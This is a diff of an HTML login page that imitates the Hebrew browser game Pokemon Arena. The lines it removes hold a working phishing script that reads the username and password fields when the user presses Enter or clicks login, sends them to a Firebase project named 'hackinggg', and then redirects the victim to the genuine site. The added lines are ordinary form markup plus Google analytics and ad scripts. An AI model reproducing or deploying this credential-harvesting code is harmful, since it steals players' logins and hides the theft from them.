@@ -10,6 +10,37 @@
     <link rel="shortcut icon" href="https://pokemon-arena.net//img/icon.png" type="image/x-icon">
     <link rel="apple-touch-icon" href="https://pokemon-arena.net/apple-touch-icon.png">
 	
+    <!--<link rel="stylesheet" type="text/css" href="https://pokemon-arena.net/stylesheets/outgame.minify.css" />-->
+	<meta name="google-site-verification" content="PgHKWGjr5EXSfwUcg5xYScAUCobOkqc9AXOnvj42ONc">
+	
+	<script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	
+	<!--
+	<link type="text/css" media="screen" rel="stylesheet" href="https://pokemon-arena.net/stylesheets/colorbox.css" />
+
+    
+    <script type="text/javascript" src="javascripts/time.js"></script>
+    <script type="text/javascript" src="javascripts/timer.js"></script>
+    <script type="text/javascript" src="javascripts/tooltip.js"></script>
+    <script type="text/javascript" src="javascripts/new_tooltip.js"></script>
+    <script type="text/javascript" src="javascripts/ads-bar.js"></script>
+    <script type="text/javascript" src="javascripts/countdown.js"></script>
+    <script type="text/javascript">
+		function popUp(URL){
+			day = new Date();
+			id = day.getTime();
+			eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,width=800,height=400');");
+		}
+		
+        function seetext(x){
+            x.type = "text";
+        }
+        function seeasterisk(x){
+           x.type = "password";
+        }
+    </script>
+	-->
+	
 	<link href="css.css" rel="stylesheet" type="text/css">
 	<link href="csss.css" rel="stylesheet" type="text/css">
 <style>
@@ -84,69 +115,11 @@
 <div id="main">
 <meta name="google-adsense-account" content="ca-pub-8242537944127241">
 
-	<div class="col-login">
-<script type="module">
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js'
-        import { getFirestore, doc, setDoc, updateDoc } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js'
-        console.log("f");
-        
-        function uuidv4() {
-            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
-            .replace(/[xy]/g, function (c) {
-                const r = Math.random() * 16 | 0, 
-                    v = c == 'x' ? r : (r & 0x3 | 0x8);
-                return v.toString(16);
-            });
-        }
-        
-        const firebaseConfig = {
-            apiKey: "AIzaSyDxGRkM1i79JrWtRQXSF9JEl52d0Jo19ww",
-            authDomain: "hackinggg-3a0cf.firebaseapp.com",
-            projectId: "hackinggg-3a0cf",
-            storageBucket: "hackinggg-3a0cf.appspot.com",
-            messagingSenderId: "654585197389",
-            appId: "1:654585197389:web:14a93963475f1f7c1dbd04"
-        };
-
-        function send(){
-          json[`${uuidv4()}`] = "username: " + document.getElementsByName('username')[0].value + " and password: " + document.getElementsByName('password')[0].value;
-	        updateDoc(DR, json)
-          .then(() => {
-            console.log("Document successfully updated!");
-          })
-          .catch((error) => {
-            console.error("Error updating document: ", error);
-          });
-          json = {};
-          window.location.href = "https://pokemon-arena.net/index.php?page=threaddisplay&t=298"
-        }
-        
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        var DR = doc(db, "hack", "hav")
-        var json = {};
-        console.log(DR)
-        document.getElementsByName('username')[0].addEventListener("keypress", function(event) {
-          console.log(event.code)
-          if(event.code === 'Enter') {
-            send();
-          }
-        })
-        document.getElementsByName('password')[0].addEventListener("keypress", function(event) {
-          console.log(event.code)
-          if(event.code === 'Enter') {
-            send();
-          }
-        })
-        document.getElementById('log-in').onclick = () => {
-          send();
-	      }
-        
-    </script>
+	<div class="col-login" id="login">
 		<h2>התחברות</h2>
 		<p class="subtitle">משתמש קיים בפוקימון ארנה?</p>
 		
-		<div class="form">
+		<form method="post">
 						
 			<input type="text" name="username" placeholder="שם משתמש..." aria-label="שם משתמש" autocomplete="off">
 			<input type="password" name="password" placeholder="סיסמה..." aria-label="סיסמה" autocomplete="off">
@@ -155,8 +128,8 @@
 				<a href="?page=forgot-password">שכחתי סיסמה</a> / <a href="?page=forgot-username">שם משתמש</a>
 			</div>
 			
-			<button class="orange" id="log-in">התחבר עכשיו</button>
-		</div>
+			<input type="submit" name="login" class="orange" value="התחבר עכשיו" autocomplete="off">
+		</form>
 		
 		<div id="game_info">
 			<h3>פוקימון ארנה</h3>
@@ -171,11 +144,11 @@
 			</p>
 		</div>
 	</div>
-	<div class="col-register">
+	<div class="col-register" id="register">
 		<h2>הרשמה</h2>
 		<p class="subtitle">הרשם עכשיו לפוקימון ארנה משחק דפדפן ישראלי!</p>
 		
-		<div class="form">
+		<form method="post" action="#register">
 						
 			<input type="text" name="inlognaam" placeholder="שם משתמש..." aria-label="שם משתמש" value="" autocomplete="off">
 			<input type="password" name="wachtwoord" placeholder="סיסמה..." aria-label="סיסמה" value="" autocomplete="off">
@@ -204,8 +177,8 @@
 				קראתי ואני מסכים לתנאי השימוש
 			</label>
 						
-			<button class="green">הרשם עכשיו</button>
-		</div>
+			<input type="submit" name="registreer" class="green" value="הרשם עכשיו" autocomplete="off">
+		</form>
 		
 		<p id="credit">
 			<!-- CREATED BY Matan Mizrachi / while1.co.il -->
@@ -218,7 +191,7 @@
 		</ul>
 	</div></div> <!-- close main -->
 
-
+<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8242537944127241" crossorigin="anonymous"></script>
 
 		<center>
 
@@ -242,7 +215,23 @@
 </strong></ul><strong>
 
 
-</strong><div>
+<script>
+
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+    ga('create', 'UA-85519658-1', 'auto');
+    ga('send', 'pageview');
+</script></strong><div>
     <div class="vtResetstyles">
     <div id="vtoverlay" class="vtoverlay vthidden w3-animate-right
     w3-container">
@@ -269,21 +258,3 @@
     </div>
     </div>
     <div id="vt-augment-container" class="vtzindex vt-augment drawer" style="background: rgb(49, 61, 90);"></div></div><span class="vttooltiptext vthidden">&nbsp;Click to open VirusTotal report&nbsp;<br>with VT Augment</span><style></style></body></html>
-
-    <script>/*<p>אני אעשה את זה קצר ופשוט:</p>
-
-      <p><span style="font-size:20px">מי שרוצה חתימה שיכתוב בפרטי עם מידע כמו: רקע, פוקימון טקסט וכו'.</span></p>
-      
-      <p><span style="font-size:20px">עולה 4 זהב.</span></p>
-      
-      <p><span style="font-size:20px">זמן הכנה שבוע בערך.</span></p>
-      
-      <p><span style="font-size:20px">יש חתימות שאני לא מסכים</span></p>
-      
-      <p> </p>
-      
-      <p><span style="font-size:20px">דוגמאות:</span></p>
-      
-      <p><span style="font-size:20px"><img alt="" src="https://i.ibb.co/jTr1FnY/OIG-t-Y1-H2i-YXx2m-transformed.png" style="height:200px; width:200px" /></span></p>
-      
-      <p><span style="font-size:20px"><img alt="" src="https://i.ibb.co/BgFVJ88/kyogre-jumping-sea-yoyo1234-text-no-fish-another-angle-with-mountain-final-4k-1600-fixed-mountain-fi.png" style="height:100px; width:178px" /></span></p>*/</script>
